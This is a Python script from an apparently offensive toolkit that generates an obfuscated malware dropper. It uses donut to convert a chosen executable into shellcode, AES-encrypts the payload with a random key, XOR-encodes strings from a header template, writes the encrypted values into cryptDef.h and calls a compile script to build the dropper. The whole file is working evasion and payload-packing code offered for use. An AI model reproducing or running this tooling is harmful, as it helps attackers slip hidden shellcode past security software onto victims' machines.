import sys, getopt
from Crypto.Cipher import AES
import os
from os import urandom
import hashlib
import random
import string
import subprocess

characters = string.ascii_letters + string.digits
password = ''.join(random.choice(characters) for i in range(16))

KEY_XOR = password.replace('"','-').replace('\'','-')
KEY_AES = urandom(16)


def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size).encode('ISO-8859-1')

def aesenc(plaintext, key):
	k = hashlib.sha256(key).digest()
	iv = 16 * b'\x00'
	plaintext = pad(plaintext)    
	cipher = AES.new(k , AES.MODE_CBC, iv)
	output = cipher.encrypt(plaintext)
	return output

def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def printCiphertext(ciphertext):
	return '{ (char)0x' + ', (char)0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' }'


def main(argv):
        fileEncrypt = open('cryptDef.h', 'w')
        fileClear = open('clearDef.h', 'r')

        if(len(argv)<2):
                print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
                print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
                exit()

        binary=""
        binaryArgs=""
        rawShellCode=""

        opts, args = getopt.getopt(argv,"hb:a:r:",["binary=","args="])
        for opt, arg in opts:
                if opt == '-h':
                        print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
                        print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
                        sys.exit()
                elif opt in ("-b", "--binary"):
                        binary = arg
                elif opt in ("-a", "--args"):
                        binaryArgs = arg
                elif opt == '-r':
                        rawShellCode = arg
        
        print('[+] Generate dropper for params:')
        print('binary ', binary)
        print('binaryArgs ', binaryArgs)
        print('')

        #dllArgs = '{} {} {}'.format(ip, port, listenerType)

        if binary:
                print('binary ', binary)
                print('binaryArgs ', binaryArgs)
                print('')
                if os.name == 'nt':
                        args = ('.\\ressources\\donut.exe', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', '.\\dropper.bin', binary)
                else:   
                        args = ('./ressources/donut', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', './dropper.bin', '-i' , binary)
                popen = subprocess.Popen(args, stdout=subprocess.PIPE)
                popen.wait()
                output = popen.stdout.read()
                
                print("[+] Generate shellcode of payload with donut")
                print(output.decode("utf-8") )

                shellcode = open("dropper.bin", "rb").read()

        elif rawShellCode:
                print('rawShellCode ', rawShellCode)
                print('')

                shellcode = open(rawShellCode, "rb").read()

        Lines = fileClear.readlines()

        AesBlock=False;
        XorBlock=False;
        # Strips the newline character
        for line in Lines:
                #print(line)

                if(XorBlock):
                        words = line.split('"')
                        if(len(words)>=3):
                                if("XorKey" in words[0]):
                                        words[1]= KEY_XOR
                                        line ='"'.join(words)

                                else:
                                        plaintext=words[1]
                                        ciphertext = xor(plaintext, KEY_XOR)
                                        
                                        words[1]= printCiphertext(ciphertext)
                                        line =''.join(words)

                if(AesBlock):
                        words = line.split('"')
                        if(len(words)>=3):
                                if("AesKey" in words[0]):
                                        words[1]= printCiphertext(KEY_AES.decode('ISO-8859-1'))
                                        line =''.join(words)

                                elif("payload" in words[0]):
                                        plaintext = shellcode
                                        ciphertext = aesenc(plaintext, KEY_AES)
                                        
                                        words[1]= printCiphertext(ciphertext.decode('ISO-8859-1'))
                                        line =''.join(words)

                if(line == "// TO XOR\n"):
                        XorBlock=True;
                        AesBlock=False;
                elif(line == "// TO AES\n"):
                        AesBlock=True;
                        XorBlock=False;

                fileEncrypt.writelines(line)

        fileEncrypt.close()

        print("[+] Compile dropper with shellcode")
        if os.name == 'nt':
                args = ".\\compile.bat".split()
        else:   
                args = "./compile.sh".split()
        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
        popen.wait()
        output = popen.stdout.read()
        print(output.decode("utf-8") )
                

if __name__ == "__main__":
    main(sys.argv[1:])

